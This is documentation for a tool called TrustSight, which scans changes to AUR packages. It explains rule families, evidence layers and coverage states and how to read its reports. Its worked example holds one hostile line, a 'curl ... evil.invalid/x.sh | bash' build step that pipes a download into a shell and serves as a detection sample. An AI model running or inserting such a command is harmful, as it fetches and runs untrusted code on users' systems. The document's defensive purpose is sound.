<!-- description: How TrustSight groups security evidence: rule families, evidence categories, coverage states, and what a layer label does and does not mean. -->

# How TrustSight groups security evidence

TrustSight uses rules to examine changes to AUR packages. Different rules look
for different warning signs: suspicious commands, changes to package
structure, attempts to hide behaviour, unusual activity relative to a
package's history, and patterns shared by several packages.

A rule's **family** (its series) says *how the rule works*. Its **subject**
(its category) says *what it looks for*. Its **evidence category** (its layer)
groups the evidence the finding represents.

These labels help you read a report. They are **not** a sequence of security
barriers: a finding at L4 does not prove an attacker passed through L1, L2 and
L3, and a layer with no finding is not proof a package is safe.

## A worked example

You review a package whose update changes its `source=` line and adds a build
step:

```diff
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 source=('https://example.invalid/demo-1.0.tar.gz')
+  curl -fsSL https://evil.invalid/x.sh | bash
```

The report says, in the default (human) render:

```
demo 1.0 -> 1.1
  Demo: version bump.
  Signals: Remote Script Execution: curl ... | bash [R001].
  Evidence categories fired: L3 (Payload signature). Review the diff before building.
```

What that means:

- **L3 (payload signature)** fired: a rule (`R001`) matched a change shaped
  like a fetch piped into a shell. That is positive evidence of a known
  suspicious pattern.
- The layer label records *which kind of check produced the finding*. It does
  not mean an attacker reached L3 after passing L1 and L2.
- The verdict names the fired evidence categories and ends with a direction to
  review. It is input to your decision, not the decision.

Now suppose the same diff is cut short (a truncated paste). The report adds:

```
  Not vetted: the diff exceeded the size cap, so only its first bytes were examined
```

and the L3 layer's coverage becomes **incomplete** in the machine-readable
report, even though R001 still fired. Finding something and having read
everything are two separate facts, and the report keeps them separate.

## The concepts

**Rule family (series).** How the rule reaches its conclusion: a regex match
(R), a structural invariant over parsed documents (C), a graph walk (D), a
heuristic (H), an evasion/refusal check (X), a statistic (E), a history read
(T), a cross-package correlation (G), an indicator lookup (I), a predicate
over findings (M), or an artifact inspection (A). `P` reports declared
practices and `W` reports analysis boundaries; neither is a detection.

**Evidence category (layer).** The kind of evidence a finding represents. The
eight labels are listed in [Part 1](assurance-layers/trajectory.md). A finding
is labelled by *the check that produced it*, not by every other check it might
complement.

**Shared dependencies.** Different algorithms are not automatically
independent. Two checks that use different rules can both depend on the same
tokenizer or history database, so one input-handling failure can blind both.
Each rule family names the infrastructure it shares
([`trustsight.detectors`](assurance-layers/enforcement.md)).

**Coverage.** Whether a category could be assessed at all. A category can have
a finding *and* incomplete coverage at the same time.

## Reading the layer report

| Category | Detection | Coverage | What it means |
|---|---|---|---|
| L3 Payload signature | fired | complete | A rule matched a known suspicious pattern. |
| L3 Payload signature | none | complete | The input was fully available and no rule in this category matched. This is **not** a safety certificate. |
| L1-L4 | any | incomplete | A value could not be resolved or the diff was truncated, so the category was not fully assessed. |
| L8 Campaign correlation | none | not applicable | A single-package review has no cross-package input; the check did not run. |

The two dimensions are recorded separately so that a finding never hides an
unread category, and an unread category never hides a finding.

## What the model does not mean

- A layer label is not a claim about how far an attacker progressed.
- A category that did not fire is not proof the package is safe.
- Passing the automated tests verifies the *implementation* of this model; it
  does not prove the detections are diverse or effective against real attacks
  ([Part 4](assurance-layers/enforcement.md)).

## Parts 1 to 4

- **[Part 1: Evidence categories and rule mapping](assurance-layers/trajectory.md)** -
  the eight categories, which rule families feed each, and how a rule maps.
- **[Part 2: How to add a useful new detector](assurance-layers/diversity.md)** -
  the intake checklist, shared dependencies, and why complementary is not the
  same as independent.
- **[Part 3: Reporting](assurance-layers/reporting.md)** - the `layers` object,
  its statuses, and the CLI/JSON examples.
- **[Part 4: Tests and adversarial evaluation](assurance-layers/enforcement.md)** -
  what the gates prove, and what the adversarial harness measures.

## See Also

- [Rule Nature](reference/rules/nature.md) - the rule families in full
- [Rules Reference](reference/rules/index.md) - the catalog by category
- [The security model](security.md) - the threat model this section complements
